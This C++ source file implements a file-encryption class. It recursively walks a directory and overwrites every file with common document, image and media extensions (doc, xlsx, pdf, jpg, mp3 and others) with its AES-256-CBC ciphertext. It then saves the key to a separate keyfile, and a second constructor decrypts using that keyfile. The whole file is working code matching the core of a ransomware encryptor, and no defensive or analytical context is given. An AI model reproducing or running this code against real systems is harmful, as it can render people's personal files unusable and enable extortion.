#include <cstdlib>
#include <cstring>
#include <string>

extern "C" {
#include <ftw.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
}

#include "encrypt.h"

std::string extensions[] = {".jpg", ".gif", ".jpeg", ".png", ".doc", ".docx", ".xls",
      ".xlsx", ".ppt", ".pptx", ".mp3", ".mp4", ".pdf", ".txt"};
const int extensionsSize = 14;
const int descriptors = 10;

Crypt *Crypt::current = NULL;

int Crypt::encryptDir(const char *name, const struct stat *stats, int flag, struct FTW *path) {
	Crypt::current->shouldEncrypt(name, flag, path);
	return 0;
}

void Crypt::handleErrors(int error) {
	if (!error) {
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	}
}

// Should probably set iv per file
void Crypt::encryptFile(const char *name) {
	FILE *inFile, *outFile;
	int len;
	EVP_CIPHER_CTX *ctx;
	unsigned char plaintext[BLOCK_SIZE];
	unsigned char ciphertext[BLOCK_SIZE];

	ctx = EVP_CIPHER_CTX_new();
	if (!ctx)
		handleErrors(0);
	handleErrors(EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, enc));
	inFile = fopen(name, "rb+");
	outFile = tmpfile();

	while (!feof(inFile)) {
		len = fread(plaintext, 1, BLOCK_SIZE, inFile);
		EVP_CipherUpdate(ctx, ciphertext, &len, plaintext, len);

		fwrite(ciphertext, 1, len, outFile);
	}

	handleErrors(EVP_CipherFinal_ex(ctx, ciphertext, &len));
	fwrite(ciphertext, 1, len, outFile);
	inFile = freopen(NULL, "wb", inFile);
	rewind(outFile);

	while(!feof(outFile)) {
		len = fread(ciphertext, 1, BLOCK_SIZE, outFile);
		fwrite(ciphertext, 1, len, inFile);
	}

	fclose(inFile);
	fclose(outFile);
	EVP_CIPHER_CTX_free(ctx);
}

void Crypt::shouldEncrypt(const char *name, int flag, struct FTW *path) {
	const char *extension = strrchr(name + path->base, '.');

	if (extension) {
		for (int i = 0; i < extensionsSize; i++) {
			if (extension == extensions[i] && flag == FTW_F) {
				encryptFile(name);
				return;
			}
		}
	}
}

int Crypt::encryptFiles(const char *dir) {
	int err = nftw(dir, Crypt::encryptDir, descriptors, 0);
	FILE *keyfile = fopen("keyfile", "wb");

	fwrite(key, 1, KEY_SIZE, keyfile);
	fwrite(iv, 1, BLOCK_SIZE, keyfile);

	return err;
}

Crypt::Crypt() {
	handleErrors(RAND_bytes(key, KEY_SIZE));
	handleErrors(RAND_bytes(iv, BLOCK_SIZE));

	enc = 1;

	Crypt::current = this;
}

Crypt::Crypt(char *keyfileName) {
	FILE *keyfile = fopen(keyfileName, "rb");

	fread(key, 1, KEY_SIZE, keyfile);
	fread(iv, 1, BLOCK_SIZE, keyfile);

	enc = 0;

	Crypt::current = this;
}
